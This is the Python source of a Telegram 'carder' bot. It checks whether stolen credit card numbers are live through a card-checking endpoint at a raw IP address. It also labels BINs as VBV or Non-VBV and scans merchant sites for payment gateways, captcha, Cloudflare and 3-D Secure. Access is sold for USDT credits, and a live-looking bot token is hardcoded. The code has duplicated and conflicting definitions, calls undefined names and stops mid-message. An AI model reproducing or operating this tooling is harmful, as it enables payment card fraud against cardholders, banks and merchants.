# --- Standard Libraries ---
import os
import sys
import re
import json
import time
import random
import string
import logging
from datetime import datetime, timedelta
from urllib.parse import urlparse
import platform

# --- Third-Party Libraries ---
import requests
from bs4 import BeautifulSoup
import telebot
from telebot import TeleBot, types
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import psutil




token = "7996462440:AAFbJjfCJdnBTGfsDWggqyS0gpKf53BBvfI" 
bot=telebot.TeleBot(token,parse_mode="HTML")
owners = ["6353114118", "6353114118"]

# 🎯 Function to check VBV status based on BIN details
def get_vbv_status(card_type, level):
    non_vbv_keywords = ["debit", "prepaid", "classic"]
    vbv_keywords = ["credit", "platinum", "signature", "infinite", "gold"]

    card_type = card_type.lower() if card_type else ""
    level = level.lower() if level else ""

    if any(word in card_type or word in level for word in non_vbv_keywords):
        return "🟢 **Non-VBV ✅**"
    if any(word in card_type or word in level for word in vbv_keywords):
        return "🔴 **VBV Enabled 🔒**"
    
    return "⚠️ **Unknown ❓**"

# 🎯 Function to fetch BIN details (Updated with backup API)
def get_bin_info(bin_number):
    primary_api = f"https://bins.antipublic.cc/bins/{bin_number}"
    backup_api = f"https://lookup.binlist.net/{bin_number}"

    try:
        # Try primary API (antipublic.cc)
        response = requests.get(primary_api, timeout=5)
        if response.status_code == 200:
            data = response.json()
        else:
            print(f"⚠️ Primary API failed. Trying backup...")
            response = requests.get(backup_api, timeout=5)
            data = response.json() if response.status_code == 200 else {}
        
    except requests.exceptions.RequestException:
        print(f"❌ Both APIs failed! Using fallback data.")
        data = {}

    # Extract details with fallback values
    bank = data.get('bank', 'Unknown')
    brand = data.get('brand', 'Unknown')
    emj = data.get('country_flag', '🏳')
    country = data.get('country_name', 'Unknown')
    level = data.get('level', 'Unknown')
    card_type = data.get('type', 'Unknown')
    url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'

    # 🔐 Check VBV Status (Updated Logic)
    vbv_status = get_vbv_status(card_type, level)

    return f"""
╭━━━[ 🔍 𝗕𝗜𝗡 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ]━━━╮
┣ 💳 **BIN:** `{bin_number}`
┣ 🏦 **Bank:** `{bank}`
┣ 🔗 **Bank URL:** `{url}`
┣ 🌍 **Country:** `{country}` {emj}
┣ 🏷 **Brand:** `{brand}`
┣ 📌 **Type:** `{card_type}`
┣ ⚡ **Level:** `{level}`
╰━━━━━━━━━━━━━━━━━━╯
🔐 **VBV Status:** {vbv_status}
"""

# ✨ Command to check BIN details
@bot.message_handler(commands=["vbv"])
def vbv_status(message):
    args = message.text.split(" ")

    if len(args) != 2:
        bot.reply_to(message, "❌ **Usage:** `/vbv <6-digit BIN>`", parse_mode="Markdown")
        return

    bin_number = args[1]
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.reply_to(message, "❌ **Please enter a valid 6-digit BIN.**", parse_mode="Markdown")
        return

    bot.reply_to(message, "🔍Fetching BIN details, please wait...")
    bin_info = get_bin_info(bin_number)
    bot.reply_to(message, bin_info, parse_mode="Markdown")

    # Track bot start time
start_time = time.time()

# Load users from file or list (modify based on your bot setup)
def get_total_users():
    try:
        with open("users.txt", "r") as f:
            return len(set(f.readlines()))
    except:
        return 0

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    ping_start = time.time()
    msg = bot.send_message(message.chat.id, "⚡ Checking status...")
    ping_time = int((time.time() - ping_start) * 1000)

    # Uptime
    uptime_seconds = int(time.time() - start_time)
    uptime = str(timedelta(seconds=uptime_seconds))

    # System info
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    system_info = platform.system() + " (" + platform.machine() + ")"
    total_users = get_total_users()

    # Stylish status message
    status = f"""<b> ✦ 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 ✦ is running...</b>

✧ <b>Ping:</b> <code>{ping_time} ms</code>
✧ <b>Up Time:</b>  <code>{uptime}</code>
✧ <b>CPU Usage:</b> <code>{cpu_usage}%</code>
✧ <b>RAM Usage:</b> <code>{ram_usage}%</code>
✧ <b>System:</b> <code>{system_info}</code>
✧ <b>Total Users:</b> <code>{total_users}</code>

✧ <b>Bot By:</b> <a href='https://t.me/SLAYER_OP7'>@SLAYER_OP7</a>
"""
    bot.edit_message_text(status, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML", disable_web_page_preview=True)


@bot.message_handler(commands=["owner"])
def owner_command(message):
    bot_name = "🚀 <b>Isagi Carders Checker</b>"
    bot_username = "@IsagiCarder_bot"
    owner_name = "👑 <b> 𓆰⎯꯭꯭‌༎𝅃꯭᳚ 𝆺꯭𝅥༎ࠫ 𝓘𝓢𝓐𝓖𝓘?𓆪꯭➤⃝ </b>"
    owner_username = "@SLAYER_oP7"
    channel_link = "https://t.me/+ChPTO181E-1mZjM1"

    response = f"""
<code>╭───────────────────────
│ 🤖 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾 
╰───────────────────────</code>

🔹 <b>Bot Name:</b> {bot_name}  
🔹 <b>Bot Username:</b> <code>{bot_username}</code>  

<code>╭───────────────────────
│ 👑 𝙾𝚆𝙽𝙴𝚁 𝙳𝙴𝚃𝙰𝙸𝙻𝚂 
╰───────────────────────</code>

👤 <b>Owner:</b> {owner_name}  
🔗 <b>Contact:</b> <a href="https://t.me/{owner_username.replace('@', '')}">{owner_username}</a>  

<code>╭───────────────────────
│ 🔹 𝙹𝙾𝙸𝙽 𝙾𝚄𝚁 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 
╰───────────────────────</code>

🔹 <a href="{channel_link}">✨ Join Our Exclusive Telegram Channel ✨</a>  
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


BIN_API_URL = "https://lookup.binlist.net/"  # Example API

def get_flag(country_code):
    """Return flag emoji from country code."""
    if not country_code:
        return "🏳️"
    return "".join([chr(127397 + ord(c)) for c in country_code.upper()])

@bot.message_handler(commands=["bin"])
def bin_command(message):
    try:
        args = message.text.split(" ")
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/bin 457173</code>\n\n⚠️ Please enter a valid BIN number.", parse_mode="HTML")
            return
        
        bin_number = args[1].strip()
        
        # Fetch BIN details
        response = requests.get(f"{BIN_API_URL}{bin_number}")
        
        if response.status_code != 200:
            bot.reply_to(message, "❌ <b>Error:</b> Invalid or unknown BIN. Please try another.", parse_mode="HTML")
            return

        bin_info = response.json()
        
        country = bin_info.get("country", {})
        bank = bin_info.get("bank", {})

        country_flag = get_flag(country.get("alpha2", ""))
        
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Premium-styled output
        reply_text = f"""
<b>━━━━━━━━━━━ [  🔍 BIN Lookup  ] ━━━━━━━━━━━</b>

<b>💳 BIN:</b> <code>{bin_number}</code>
<b>🏦 Bank:</b> <code>{bank.get('name', 'Unknown')}</code>
<b>🌍 Country:</b> <code>{country.get('name', 'Unknown')}</code> {country_flag}
<b>💰 Currency:</b> <code>{country.get('currency', 'N/A')}</code>
<b>💳 Card Type:</b> <code>{bin_info.get('type', 'N/A')}</code>
<b>🔄 Brand:</b> <code>{bin_info.get('scheme', 'N/A')}</code>
<b>🏷️ Prepaid:</b> <code>{'Yes ✅' if bin_info.get('prepaid') else 'No ❌'}</code>

<b>━━━━━━━━━━━ [  👤 User Info  ] ━━━━━━━━━━━</b>

<b>👤 Checked by:</b> <code>{message.from_user.first_name}</code>
<b>🕒 Timestamp:</b> <code>{timestamp}</code>

<b>━━━━━━━━━━━ [  🚀 Powered By  ] ━━━━━━━━━━━</b>
<i>🔹 Isagi carder's – Premium BIN Lookup 🔹</i>
"""
        bot.reply_to(message, reply_text, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")

# Custom API URL for Braintree card checking
API_URL = "http://194.164.150.141:8099/key=darkk/cc="

# Function to check card using the custom Braintree API
def check_card(card_number):
    # Construct the URL with the card number
    url = f"{API_URL}{card_number}"
    
    try:
        # Make the HTTP GET request to the custom Braintree API
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()  # Assuming the API returns JSON data
            
            # Extract card details from the response
            return {
                "status": data.get("status", "Unknown"),
                "tok": card_number[:6],  # BIN (first 6 digits)
                "bank_name": data.get("bank_name", "N/A"),
                "card_type": data.get("card_type", "N/A"),
                "country_name": data.get("country_name", "N/A"),
                "country_flag": data.get("country_flag", "❌"),
            }
        else:
            return {
                "status": "Error",
                "tok": card_number[:6],
                "bank_name": "N/A",
                "card_type": "N/A",
                "country_name": "N/A",
                "country_flag": "❌",
            }
    except Exception as e:
        # Handle any errors during the request
        return {
            "status": "Error",
            "tok": card_number[:6],
            "bank_name": "N/A",
            "card_type": "N/A",
            "country_name": "N/A",
            "country_flag": "❌",
        }

# Function to get BIN details
def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Unknown Bank")
            card_type = data.get("type", "Unknown").capitalize()
            country = data.get("country", {}).get("name", "Unknown Country")
            country_emoji = data.get("country", {}).get("emoji", "🌍")
            return bank, card_type, country, country_emoji
        else:
            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
    except:
        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"

# Command handler for /b3
@bot.message_handler(commands=["b3"])
def handle_b3(message):
    user_input = message.text.split()[1:]  # Get user input (cards list after /b3 command)
    if not user_input:
        bot.reply_to(message, "Please provide a list of card numbers to check.")
        return
    
    # Start time tracking
    start_time = time.time()

    # Check cards one by one
    checked_cards = []
    for card in user_input:
        card_details = check_card(card.strip())
        
        # Extract details from card_details
        status = card_details["status"]
        bank_name = card_details["bank_name"]
        card_type = card_details["card_type"]
        country_name = card_details["country_name"]
        country_flag = card_details["country_flag"]
        tok = card_details["tok"]
        
        # Get response time
        response_time = round(time.time() - start_time, 2)

        # Build the response message using the provided format
        response = f"""
╭─━━━━━━━━━━━━━━━━━━━─╮
    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
╰─━━━━━━━━━━━━━━━━━━━─╯

📌 Card: <code>{card.strip()}</code>  
📌 Status: <code>{status}</code>
📌 Gateway: <code>Braintree Auth</code>
📌 BIN: <code>{tok}</code>
📌 Bank: <code>{bank_name}</code>
📌 Type: <code>{card_type}</code>
📌 Country: <code>{country_name} {country_flag}</code>
📌 Checked By: <code>{message.from_user.username if message.from_user else "Unknown"}</code>
📌 Response Time: <code>{response_time}s</code>

╭─━━━━━━━━━━━━━━━─╮
𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻
╰─━━━━━━━━━━━━━━━─╯
        """
        checked_cards.append(response)
    
    # Send the results back to the user
    bot.reply_to(message, '\n'.join(checked_cards), parse_mode="HTML", disable_web_page_preview=True)





@bot.message_handler(commands=["channel"])
def channel_info(message):
    channel_name = "✨ <b>ISAGI CRACKS </b>"
    channel_link = "https://t.me/+ChPTO181E-1mZjM1"

    related_channels = [
        ("💎 <b>Channels List</b>", "https://t.me/addlist/d8NBZ28sPn04ZjI1"),
        ("💬 <b>Our Chat Group</b>", "https://t.me/+MGsU6cpAfesxOTg1"),
    ]

    owner_contact = "@SLAYER_OP7"

    response = f"""
<code>╭───────────────────────
│ 📢 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻 𝙲𝙷𝙰𝙽𝙽𝙴𝙻  
╰───────────────────────</code>

🔹 {channel_name}  
🔗 <a href='{channel_link}'>✨ Join Here ✨</a>  

<code>╭───────────────────────
│ 🔹 𝚁𝙴𝙻𝙰𝚃𝙴𝙳 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂  
╰───────────────────────</code>
"""
    for name, link in related_channels:
        response += f"🔹 <a href='{link}'>{name}</a>\n"

    response += f"""

<code>╭───────────────────────
│ 👤 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃  
╰───────────────────────</code>

👑 <b>Contact:</b> <a href='https://t.me/{owner_contact.replace('@', '')}'>{owner_contact}</a>
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


    # ✅ Admin User IDs (Replace with actual admin Telegram IDs)
ADMINS = ["6353114118"]

# ✅ Credits Storage File
CREDITS_FILE = "user_credits.json"

# ✅ Function to Load or Fix `user_credits.json`
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)

    try:
        with open(CREDITS_FILE, "r") as f:
            data = f.read().strip()
            return json.loads(data) if data else {}  # ✅ Return {} if file is empty
    except (json.JSONDecodeError, ValueError):  # ✅ Reset if corrupted
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)
        return {}

# ✅ Function to Save Credits Securely
def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

# ✅ Function to Get User Balance
def get_balance(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

# ✅ Function to Deduct Credits (Secure)
def deduct_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    if credits.get(user_id, 0) >= amount:  # ✅ Ensure user has enough credits
        credits[user_id] -= amount
        save_credits(credits)
        return True
    return False  # ✅ Return False if not enough credits

# ✅ Function to Add Credits
def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    credits[user_id] = credits.get(user_id, 0) + amount  # ✅ Ensure balance updates correctly
    save_credits(credits)  # ✅ Save updated balance

    notify_user(user_id, amount)  # ✅ Notify user

# ✅ Function to Notify User When Credits Are Added
def notify_user(user_id, amount):
    bot.send_message(user_id, f"""
🎉 <b>💎 VIP Credits Added!</b>  
━━━━━━━━━━━━━━  
💰 <b>+{amount} Credits</b> added to your balance.  
💳 <b>New Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>  
""", parse_mode="HTML")

# ✅ `/addcredits` Command for Admins (Add Credits to User)
@bot.message_handler(commands=["addcredits"])
def add_user_credits(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "🚫 <b>Access Denied!</b> You are not authorized to add credits.", parse_mode="HTML")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise ValueError("Invalid command format")

        _, user_id, amount = command_parts

        if not user_id.isdigit():
            raise ValueError("User ID must be a number")

        user_id = str(user_id)
        amount = int(amount)

        add_credits(user_id, amount)
        new_balance = get_balance(user_id)

        bot.reply_to(message, f"✅ <b>Success!</b> Added {amount} credits to user <code>{user_id}</code>. New balance: {new_balance} Credits.", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 <b>Credits Added!</b>\n💰 <b>+{amount} Credits</b>\n💳 <b>New Balance:</b> {new_balance} Credits", parse_mode="HTML")

    except ValueError:
        bot.reply_to(message, "⚠️ <b>Invalid Format!</b> Use <code>/addcredits user_id amount</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)}", parse_mode="HTML")

# ✅ `/balance` Command to Show User's Balance
@bot.message_handler(commands=["balance"])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name
    balance = get_balance(user_id)

    bot.reply_to(message, f"""
💰 <b>💎 VIP Balance Dashboard 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
🆔 <b>User ID:</b> <code>{user_id}</code>  
💳 <b>Current Balance:</b> {balance} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>
""", parse_mode="HTML")
    

    
@bot.message_handler(commands=["plans"])
def plan_command(message):
    usdt_rate = get_usdt_to_inr()  # Get the latest USDT to INR rate

    # ✅ Convert USDT to INR dynamically
    prices = {
        "50 Credits": (2, round(2 * usdt_rate)),  # 1 USDT
        "350 Credits": (4, round(4 * usdt_rate)),  # 5 USDT
        " 400 Credits": (10, round(10 * usdt_rate)),  # 10 USDT
        "1000 Credits": (20, round(20 * usdt_rate)),  # 20 USDT
    }

    # ✅ Generate Pricing Message
    price_message = "\n".join([f"🔹 <b>{k}</b> ➝ <code>{v[0]} USDT</code> | <code>₹{v[1]}</code>" for k, v in prices.items()])

    plan_message = f"""
🎩 <b>VIP Credit Plans</b> 💳  
━━━━━━━━━━━━━━━━━━━━━━  
📌 <b>Live USDT Rate:</b> <code>1 USDT = ₹{usdt_rate}</code>  
📌 <b>Pricing (Auto-Updated)</b>:  
{price_message}  
━━━━━━━━━━━━━━━━━━━━━━  
💡 <b>✨ Why Buy VIP Credits?</b>  
✅ <i>Access <b>Exclusive VIP Features</b></i>  
✅ <i><b>Fast</b> & <b>Secure</b> Transactions</i>  
✅ <i>24/7 <b>Premium Support</b></i>  
━━━━━━━━━━━━━━━━━━━━━━  
📢 <b>Click the button below to buy credits instantly!</b>  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💰 Buy Credits Now", url=OWNER_LINK)
    )

    bot.send_message(message.chat.id, plan_message, parse_mode="HTML", reply_markup=keyboard)

@bot.message_handler(commands=["help"])
def help_command(message):
    help_text = f"""
<code>╭───────────────────────────────
│ 🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 🔥
╰───────────────────────────────</code>

✨ <b>Exclusive Commands:</b>  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🔹 <b>/owner</b> - 👑 Owner Information  
🔹 <b>/channel</b> - 📢 Official Updates & News  
🔹 <b>/bin</b> - 💳 BIN Lookup (Bank, Country, etc.)  
🔹 <b>/vbv</b> - 🔍 VBV & Non-VBV Card Checker  
🔹 <b>/chk</b> - ✅ Card Validity Check  
🔹 <b>/killcc</b> - 🔪 Instantly Terminate Visa Cards  
🔹 <b>/code</b> - 🔐 Generate Exclusive Redeem Codes  
🔹 <b>/info</b> - 📜 View Your User Details  
🔹 <b>/redeem</b> - 🎟️ Activate Premium Access  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
💬 <b>Need Help?</b> Contact <a href='https://t.me/SLAYER_OP7'>@SLAYER_OP7</a>  
📢 <b>Stay Updated:</b> <a href='https://t.me/+ChPTO181E-1mZjM1'>Join Official Channel</a>  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
<code>🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 🔥</code>
"""
    bot.reply_to(message, help_text, parse_mode="HTML", disable_web_page_preview=True)



@bot.message_handler(commands=['gate'])
def check_gateway(message):
    # Check if the user has provided a URL after the command
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Please provide a URL after the /gate command. Example: /gate https://example.com")
        return
    
    # Extract the URL provided by the user
    url = message.text.split(' ', 1)[1]  # Get URL after "/gate"
    
    # Check if the URL is valid (simple check)
    if not url.startswith("http"):
        bot.reply_to(message, "❌ Invalid URL! Please make sure the URL starts with http:// or https://")
        return
    
    try:
        # Send a request to the provided URL
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            bot.reply_to(message, f"❌ Failed to fetch the site. Status code: {response.status_code}")
            return
        
        # Parse the page for additional info (like captcha detection)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for common captcha identifiers
        captcha = 'No captcha detected'
        if soup.find('div', {'id': 'captcha'}) or soup.find('iframe', {'src': 'captcha'}):
            captcha = 'Captcha detected'
        elif soup.find('script', {'src': 'https://www.google.com/recaptcha/api.js'}):
            captcha = 'Google reCAPTCHA detected'
        
        # Check for Cloudflare protection
        cloudflare = 'None'
        if soup.find('title', text='Checking your browser...'):
            cloudflare = 'Cloudflare detected'
        
        # Check for 3D Secure (3DS) indicator
        security_3ds = 'No 3D Secure detected'
        if '3D Secure' in soup.text or '3ds' in soup.text.lower():
            security_3ds = '3D Secure (3DS) detected'

        # Look for different payment gateway mentions
        gateways = []
        if 'Stripe' in soup.text:
            gateways.append('Stripe')
        if 'Square' in soup.text:
            gateways.append('Square')
        if 'PayPal' in soup.text:
            gateways.append('PayPal')
        if 'Woocommerce' in soup.text:
            gateways.append('Woocommerce')
        if 'Klarna' in soup.text:
            gateways.append('Klarna')
        if 'Afterpay' in soup.text:
            gateways.append('Afterpay')
        if 'Braintree' in soup.text:
            gateways.append('Braintree')
        if 'Adyen' in soup.text:
            gateways.append('Adyen')
        if 'Apple Pay' in soup.text:
            gateways.append('Apple Pay')
        if 'Google Pay' in soup.text:
            gateways.append('Google Pay')
        if 'Amazon Pay' in soup.text:
            gateways.append('Amazon Pay')
        if 'Alipay' in soup.text:
            gateways.append('Alipay')
        if 'WeChat Pay' in soup.text:
            gateways.append('WeChat Pay')
        if 'Payoneer' in soup.text:
            gateways.append('Payoneer')
        if 'Skrill' in soup.text:
            gateways.append('Skrill')
        if '2Checkout' in soup.text:
            gateways.append('2Checkout')
        if 'Authorize.Net' in soup.text:
            gateways.append('Authorize.Net')
        if 'Worldpay' in soup.text:
            gateways.append('Worldpay')
        if 'Razorpay' in soup.text:
            gateways.append('Razorpay')
        
        gateway_info = ', '.join(gateways) if gateways else 'No specific payment gateways found'
        
        # Send the result back to the user
        reply = f"""
        ┏━━━━━━━⍟
        ┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 : ✅
        ┗━━━━━━━━━━━━⊛
        ─━─━─━─━─━─━─━─━─━─
        ➥ 𝗦𝗶𝘁𝗲 -» {url}
        ➥ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 -» {gateway_info}
        ➥ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 -» {captcha}
        ➥ 𝗖𝗹𝗼𝗨𝗳𝗹𝗮𝗿𝗲 -» {cloudflare}
        ➥ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 -» {security_3ds}
        ➥ 𝗖𝗩𝗩/𝗖𝗩𝗖 -» N/A
        ➥ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 -» N/A
        ➥ 𝗦𝗧𝗔𝗧𝗨𝗦 -» {response.status_code}
        ─━─━─━─━─━─━─━─━─━─
        """
        
        bot.reply_to(message, reply)
    
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

      
owners = ["6353114118"]  # List of admin IDs
LOGS_CHANNEL_ID = -1002576465941  # Replace 

valid_redeem_codes = {}  # Stores codes with expiration times

# Function to check if a user's access is still valid
def is_user_allowed(user_id):
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip().split(":")[0] for id in allowed_ids]  # Extract user IDs
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it.")
    return False

# Function to add a user with an expiration time
def add_user(user_id, expire_time):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}:{expire_time}\n")  # Store user ID with expiration time
    
    # Send confirmation message to user
    bot.send_message(user_id, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(expire_time)}</b>.", parse_mode="HTML")

    # Log to Telegram Channel
    bot.send_message(LOGS_CHANNEL_ID, f"✅ <b>New User Access</b>\n"
                                      f"👤 User ID: <code>{user_id}</code>\n"
                                      f"🕒 Expires on: {time.ctime(expire_time)}",
                     parse_mode="HTML")

# Function to remove expired users and log to channel
def remove_expired_users():
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                user, expire = line.strip().split(":")
                if float(expire) < current_time:
                    bot.send_message(LOGS_CHANNEL_ID, f"❌ <b>User Access Expired</b>\n"
                                                      f"👤 User ID: <code>{user}</code>\n"
                                                      f"🕒 Expired on: {time.ctime(float(expire))}",
                                     parse_mode="HTML")
                    # Send message to user
                    bot.send_message(user, "❌ Your access has expired. Please contact support if you need more time.")
                    continue  # Remove expired users
                file.write(line + "\n")
    except FileNotFoundError:
        print("id.txt file not found.")

# Function to generate a unique redeem code
def generate_redeem_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

# Admin creates a redeem code with a time limit
@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to create codes.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ Usage: `/code <days>`\nExample: `/code 3` for 3 days", parse_mode="Markdown")
        return

    days = int(args[1])
    expire_time = time.time() + (days * 86400)  # Convert days to seconds
    code = generate_redeem_code()

    valid_redeem_codes[code] = expire_time  # Store code with expiration time

    bot.reply_to(message, f"✅ Redeem Code Created:\n`{code}` (Valid for {days} days)", parse_mode="Markdown")

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

    USER_FILE = "user.txt"

# Function to get all registered user IDs from user.txt
def get_registered_users():
    if not os.path.exists(USER_FILE):
        return []
    with open(USER_FILE, "r") as file:
        users = file.readlines()
    return [line.split(",")[0] for line in users]  # Extract user IDs


get_registered_users = {}
# Function to check if a user is registered
def is_registered(user_id):
    if not os.path.exists(USER_FILE):
        return False
    with open(USER_FILE, "r") as file:
        registered_users = file.readlines()
    return str(user_id) in [line.split(",")[0] for line in registered_users]

# Function to register a user
def register_user(user_id, first_name, username):
    with open(USER_FILE, "a") as file:
        file.write(f"{user_id},{first_name},{username}\n")

@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.from_user.id)

    # Ensure only the owner can broadcast
    if user_id not in owners:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Ask the owner what message they want to send
    bot.reply_to(message, "📢 Send the message, sticker, GIF, or video you want to broadcast.")
    bot.register_next_step_handler(message, send_broadcast)

def send_broadcast(message):
    user_id = str(message.from_user.id)

    # Fetch all registered users
    registered_users = get_registered_users()

    # Create inline buttons for Owner and Admin
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("👑 Owner", url="https://t.me/SLAYER_OP7"),
        InlineKeyboardButton("🔥 Channel", url="https://t.me/+ChPTO181E-1mZjM1")
    )

    # Count successful and failed messages
    success_count = 0
    failed_count = 0

    for user in registered_users:
        try:
            if message.text:  # Sending text messages
                bot.send_message(user, message.text, reply_markup=keyboard)
            elif message.photo:  # Sending photos
                bot.send_photo(user, message.photo[-1].file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.sticker:  # Sending stickers
                bot.send_sticker(user, message.sticker.file_id, reply_markup=keyboard)
            elif message.animation:  # Sending GIFs
                bot.send_animation(user, message.animation.file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.video:  # Sending videos
                bot.send_video(user, message.video.file_id, caption=message.caption or "", reply_markup=keyboard)
            else:
                continue

            success_count += 1  # Increment success count
        except Exception as e:
            print(f"Failed to send to {user}: {e}")
            failed_count += 1

    # Send a completion message to the owner
    bot.send_message(user_id, f"✅ Broadcast completed!\n📨 Sent: {success_count}\n❌ Failed: {failed_count}")



USER_FILE = "user.txt"

# Function to check if a user is registered
def is_registered(user_id):
    if not os.path.exists(USER_FILE):
        return False
    with open(USER_FILE, "r") as file:
        registered_users = file.readlines()
    return str(user_id) in [line.split(",")[0] for line in registered_users]

# Function to register a user
def register_user(user_id, first_name, username):
    with open(USER_FILE, "a") as file:
        file.write(f"{user_id},{first_name},{username}\n")

# This function will check if the user is authorized, you should implement it
def is_user_allowed(user_id):
    with open("users.txt", "r", encoding="utf-8") as file:
        allowed_ids = file.readlines()
    for line in allowed_ids:
        parts = line.strip().split(",")
        if len(parts) == 3:
            user, _, _ = parts
            if user == user_id:
                return True
    return False

# This function will register the user in the 'users.txt' file
def register_user(user_id, first_name, username):
    with open("users.txt", "a", encoding="utf-8") as file:
        file.write(f"{user_id},{first_name},{username}\n")

# /start command
@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    first_name = message.from_user.first_name or "Unknown"
    username = message.from_user.username or "No Username"
    
    # Register the user when they start the bot
    register_user(user_id, first_name, username)

    # Check if the user is authorized
    if is_user_allowed(user_id):
        response = f"""
<code>╭──────────────────────────
│ 🔥 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 🔥
╰──────────────────────────</code>

👤 <b>Welcome, {first_name}!</b>  
💠 <b>Username:</b> @{username}  
🔹 <b>User ID:</b> <code>{user_id}</code>  

💳 <b>Send Your Combo, and I Will Check Your CC.</b>  
📌 <b>Use /help to see all features!</b> 🚀  
